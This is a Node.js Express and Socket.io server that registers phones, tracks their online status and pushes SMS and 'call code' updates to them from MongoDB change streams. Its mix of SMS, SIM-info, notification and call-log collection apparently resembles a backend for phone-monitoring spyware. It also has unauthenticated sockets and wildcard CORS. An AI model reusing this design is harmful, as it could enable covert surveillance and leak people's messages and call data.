import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);

// ⭐ Socket.io with long timeouts (random disconnect fix)
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  pingInterval: 25000,
  pingTimeout: 60000,
  connectTimeout: 60000,
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// =============== DEVICE SOCKET MAP ===============
const deviceSockets = new Map();

// =================================================
// =============== SOCKET CONNECTION ===============
// =================================================

io.on("connection", (socket) => {
  // 👉 deviceId header + query dono se support
  const deviceIdFromQuery = socket.handshake?.query?.deviceId;
  const deviceIdFromHeader = socket.handshake?.headers?.deviceid;
  const displayId = deviceIdFromHeader || deviceIdFromQuery || socket.id;

  console.log("🟢 Client connected:", displayId);

  let currentDeviceId = null;

  // ---------- REGISTER DEVICE ----------
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    console.log(`📡 registerDevice → ${uniqueid}, socket=${socket.id}`);

    // OLD SOCKET HANDLE – but DO NOT force disconnect new connection
    if (deviceSockets.has(uniqueid)) {
      const oldSocketId = deviceSockets.get(uniqueid);

      if (oldSocketId && oldSocketId !== socket.id) {
        const oldSocket = io.sockets.sockets.get(oldSocketId);
        if (oldSocket) {
          console.log(
            `♻️ Updating socket reference for ${uniqueid} (old=${oldSocketId}, new=${socket.id})`
          );
        }
      }
    }

    currentDeviceId = uniqueid;
    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);

    console.log(`📱 Registered Device: ${uniqueid}`);

    saveLastSeen(uniqueid, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });
  });

  // ---------- DEVICE STATUS ----------
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ deviceStatus → ${uniqueid}: ${connectivity}`);

    saveLastSeen(uniqueid, connectivity);

    io.emit("deviceStatus", {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    });

    io.emit("deviceListUpdated", {
      event: "status_changed",
      uniqueid,
      connectivity,
    });
  });

  // ---------- DISCONNECT ----------
  socket.on("disconnect", (reason) => {
    console.log("🔴 Socket disconnected:", socket.id, "reason:", reason);

    if (!currentDeviceId) return;

    setTimeout(() => {
      const mappedSocketId = deviceSockets.get(currentDeviceId);

      // Agar map me ab naya socket aa chuka hai (different id),
      // to purane wale ke disconnect par OFFLINE mat karo.
      if (!mappedSocketId || mappedSocketId !== socket.id) {
        console.log(
          `ℹ️ Skip offline for ${currentDeviceId} (another socket is active or none)`
        );
        return;
      }

      deviceSockets.delete(currentDeviceId);

      console.log(`📵 Device fully offline → ${currentDeviceId}`);

      saveLastSeen(currentDeviceId, "Offline");

      io.emit("deviceStatus", {
        uniqueid: currentDeviceId,
        connectivity: "Offline",
        updatedAt: new Date(),
      });

      io.emit("deviceListUpdated", {
        event: "device_disconnected",
        uniqueid: currentDeviceId,
      });
    }, 4000);
  });
});

// =================================================
// =============== HELPERS =========================
// =================================================

async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;

    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ saveLastSeen Error:", err.message);
  }
}

export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`📞 CallCode sent → ${uniqueid}`);
  } else {
    console.log(`⚠️ No active socket for ${uniqueid} to send CallCode`);
  }
}

// =================================================
// =============== DATABASE WATCHERS ===============
// =================================================

mongoose.connection.once("open", () => {
  console.log("📡 MongoDB Connected – Watching Collections...");

  // DEVICE WATCH
  mongoose.connection
    .collection("devices")
    .watch()
    .on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updated = await mongoose.connection
        .collection("devices")
        .findOne({ _id: change.documentKey._id });

      if (updated) {
        io.emit("deviceListUpdated", {
          event: "db_change",
          device: updated,
        });
      }
    });

  // SIM INFO WATCH
  mongoose.connection
    .collection("siminfos")
    .watch()
    .on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updated = await mongoose.connection
        .collection("siminfos")
        .findOne({ _id: change.documentKey._id });

      if (updated) {
        io.emit("simInfoUpdated", { sim: updated });
      }
    });

  // CALL CODE WATCH
  mongoose.connection
    .collection("callcodes")
    .watch()
    .on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updated = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: change.documentKey._id });

      if (updated) {
        sendCallCodeToDevice(updated.deviceId, updated);
      }
    });

  // SMS WATCH
  mongoose.connection
    .collection("sms")
    .watch()
    .on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updated = await mongoose.connection
        .collection("sms")
        .findOne({ _id: change.documentKey._id });

      if (updated) {
        const socketId = deviceSockets.get(updated.deviceId);
        if (socketId && io.sockets.sockets.get(socketId)) {
          io.to(socketId).emit("smsUpdate", updated);
        }
      }
    });
});

// =================================================
// =============== EXPRESS ROUTES ==================
// =================================================

app.get("/", (req, res) => {
  res.send("Server Running with Sockets + Mongo Streams");
});

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 SERVER LIVE → http://localhost:${PORT}`)
);
